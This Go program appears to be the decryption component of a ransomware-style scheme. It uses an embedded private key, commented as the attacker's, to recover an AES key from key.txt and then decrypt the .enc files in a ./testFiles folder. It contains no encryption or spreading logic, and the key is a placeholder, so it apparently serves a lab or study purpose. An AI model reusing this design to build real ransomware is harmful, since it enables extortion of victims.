package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"os"
	"bytes"
	"log"
	"path/filepath"
)

// RSA Private Key (Attacker's private key for decryption)
const privateKeyPEM = `-----BEGIN RSA PRIVATE KEY-----
privaAAAAAAAATE
-----END RSA PRIVATE KEY-----
`

func readKeyFromFile(filename string) ([]byte, error) {
    key, err := os.ReadFile(filename)
    if err != nil {
        return nil, err
    }
    return bytes.TrimSpace(key), nil // Remove any extra newlines/spaces
}

// Decrypt AES Key using RSA Private Key
func decryptAESKeyWithRSA(encryptedKey []byte) ([]byte, error) {
	block, _ := pem.Decode([]byte(privateKeyPEM))
	if block == nil {
		return nil, fmt.Errorf("failed to parse RSA private key")
	}
	privKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return nil, err
	}

	// Decrypt AES Key
	hash := sha256.New()
	decryptedKey, err := rsa.DecryptOAEP(hash, nil, privKey, encryptedKey, nil)
	if err != nil {
		return nil, err
	}
	return decryptedKey, nil
}

// Decrypt file with AES-GCM
func decryptFile(path string, aesKey []byte) error {
	// Read encrypted file
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	// Initialize AES
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}

	// Extract nonce
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]

	// Decrypt data
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return err
	}

	// Write decrypted file
	err = os.WriteFile(path[:len(path)-4], plaintext, 0666)
	if err == nil {
		os.Remove(path) // Delete encrypted file
	}
	return err
}

// Walk through directory and decrypt files
func decryptDirectory(dir string, aesKey []byte) {
	filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err == nil && !info.IsDir() && filepath.Ext(path) == ".enc" {
			fmt.Println("Decrypting:", path)
			decryptFile(path, aesKey)
		}
		return nil
	})
}

// Main function
func main() {
	// Load Encrypted AES Key from User
	encryptedKeyBase64, err := readKeyFromFile("key.txt")
	if err != nil {
	    log.Fatal("Failed to read key:", err)
	}


	// Decode Base64 Key
	encryptedKey, _ := base64.StdEncoding.DecodeString(string(encryptedKeyBase64))

	// Decrypt AES Key
	aesKey, err := decryptAESKeyWithRSA(encryptedKey)
	if err != nil {
		panic("Failed to decrypt AES key")
	}

	// Decrypt Files
	decryptDirectory("./testFiles", aesKey)
}
